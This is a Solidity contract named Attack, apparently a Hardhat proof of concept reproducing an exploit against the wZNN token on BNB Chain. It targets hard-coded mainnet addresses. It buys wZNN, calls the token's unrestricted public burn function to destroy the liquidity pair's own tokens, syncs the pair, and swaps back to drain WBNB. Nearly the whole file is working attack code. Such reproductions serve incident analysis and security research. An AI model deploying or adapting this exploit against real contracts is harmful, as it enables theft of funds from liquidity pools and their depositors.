pragma solidity 0.8.0;

import "hardhat/console.sol";

interface Router {
        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface WBNB {

    function approve(address guy, uint256 wad) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function deposit() external payable;

}

interface wZNN {

    function approve(address spender, uint256 amount) external returns (bool);

    function burn(address account, uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);

}

interface Pair {

    function sync() external;


}

contract Attack{

    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address wznn = 0x8A7ca49F42e5196c26BB00Fa014352E5D065Db4d;
    address pair = 0xa6744c5065e778B47a9ab4Ce1E2dC4A6b489effA;
    address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function start() public {
        WBNB(wbnb).approve(router,type(uint256).max);
        wZNN(wznn).approve(router,type(uint256).max);
        WBNB(wbnb).approve(pair,type(uint256).max);
        wZNN(wznn).approve(pair,type(uint256).max);
        console.log("Get WBNB");
        WBNB(wbnb).deposit{value:1000000000000000000,gas:40000}();
        uint bnb_amount = 0.001 ether;
        console.log("1.swap wZNN");
         //    生成swap WBNB->wZNN 的路径数组
        address[] memory path = new address[](2);
        path[0] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        path[1] = 0x8A7ca49F42e5196c26BB00Fa014352E5D065Db4d;
        Router(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(bnb_amount,0,path,address(this),block.timestamp);
        console.log("2.burn wZNN");
        wZNN(wznn).burn(pair,2646845010027);
        Pair(pair).sync();
        uint attacker_wznn_balance = wZNN(wznn).balanceOf(address(this));
        wZNN(wznn).approve(router,type(uint256).max);
        console.log("3.expolit");
         //    生成swap wZNN -> WBNB 的路径数组
        // address[] memory path = new address[](2);
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        path[0] = 0x8A7ca49F42e5196c26BB00Fa014352E5D065Db4d;

        Router(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(attacker_wznn_balance,0,path,address(this),block.timestamp);
        uint attacker_balance_Wbnb = WBNB(wbnb).balanceOf(address(this));
        console.log("Finish attacking,Attacker WBNB balance:",attacker_balance_Wbnb / 1 ether);
    }

   receive() payable external{}

}